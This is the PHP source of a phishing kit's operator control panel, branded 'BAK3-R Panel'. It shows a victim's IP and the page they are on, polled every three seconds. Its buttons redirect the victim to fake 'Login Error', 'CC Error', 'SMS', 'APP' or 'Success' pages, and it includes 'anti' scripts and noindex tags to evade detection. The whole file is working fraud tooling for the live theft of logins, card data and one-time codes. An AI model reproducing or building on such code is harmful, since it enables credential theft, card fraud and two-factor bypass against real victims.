<?php 
error_reporting(0);
session_start();
require_once "functions.php";
require_once "func.php";
require_once "bak3r.php";
include "./anti/anti1.php";
include "./anti/anti2.php";
include "./anti/anti3.php";
include "./anti/anti4.php";
include "./anti/anti5.php";
include "./anti/anti6.php";
include "./anti/anti7.php";
include "./anti/anti8.php";

// Redirect to login if not authenticated
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: control-login.php");
    exit;
}

$userIP = isset($_GET['ip']) ? htmlspecialchars($_GET['ip'], ENT_QUOTES) : '';

// Validate IP format
if (!empty($userIP) && preg_match('/^[a-f0-9\.\:]+$/i', $userIP)) {
    $userStatus = getUserStatus($userIP);
} else {
    $userStatus = ['status' => 'invalid', 'page' => 'Invalid IP address'];
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAK3-R Panel</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="./media/panel.css">
</head>

<body>
    <div class="panel-box">
        <h2 class="panel-title">Redirect <?php echo htmlspecialchars($_GET['ip'] ?? '', ENT_QUOTES); ?></h2>

        <div class="user-status" id="userStatus">
            <div class="status-indicator <?php echo $userStatus['status']; ?>"></div>
            <span class="status-text"><?php echo ucfirst($userStatus['status']); ?></span>
            <div class="page-location"><?php echo $userStatus['page']; ?></div>
        </div>
        <br>
        <br>
        <?php if (isset($_GET['success']) && $_GET['success'] == 1): ?>
        <div class="panel-success">
            Redirected Successfully
        </div>
        <hr>
        <?php endif; ?>

        <form method="post" action="./infos.php" class="panel-form">
            <input type="hidden" name="step" value="control">
            <input type="hidden" name="ip" value="<?php echo htmlspecialchars($_GET['ip'] ?? '', ENT_QUOTES); ?>">

            <button type="submit" class="panel-button panel-button-warning" name="to" value="loginerror">Login
                Error</button>
            <button type="submit" class="panel-button panel-button-warning" name="to" value="cc">CC Error</button>
            <button type="submit" class="panel-button panel-button-success" name="to" value="sms">SMS</button>
            <button type="submit" class="panel-button panel-button-success" name="to" value="app">APP</button>
            <button type="submit" class="panel-button panel-button-success" name="to" value="finish">Success</button>
        </form>



        <div class="panel-footer">𝔹𝔸𝕂3ℝ • &copy; <?php echo date("Y"); ?></div>
    </div>

    <script>
    // Remove ?success=1 from URL without reloading
    if (window.location.search.includes('success=1')) {
        const url = new URL(window.location);
        url.searchParams.delete('success');
        window.history.replaceState({}, document.title, url.pathname + url.search);
    }
    </script>

    <script>
    // Function to update user status - only if IP is valid
    function updateUserStatus() {
        <?php if (!empty($userIP) && preg_match('/^[a-f0-9\.\:]+$/i', $userIP)): ?>
        fetch(`get_status.php?ip=<?php echo $userIP; ?>`)
            .then(response => response.json())
            .then(data => {
                const statusElem = document.getElementById('userStatus');
                statusElem.querySelector('.status-indicator').className =
                    'status-indicator ' + data.status;
                statusElem.querySelector('.status-text').textContent =
                    data.status.charAt(0).toUpperCase() + data.status.slice(1);
                statusElem.querySelector('.page-location').textContent = data.page;
            })
            .catch(error => console.error('Error fetching status:', error));
        <?php endif; ?>
    }

    // Update status every 3 seconds
    setInterval(updateUserStatus, 3000);
    </script>

</body>

</html>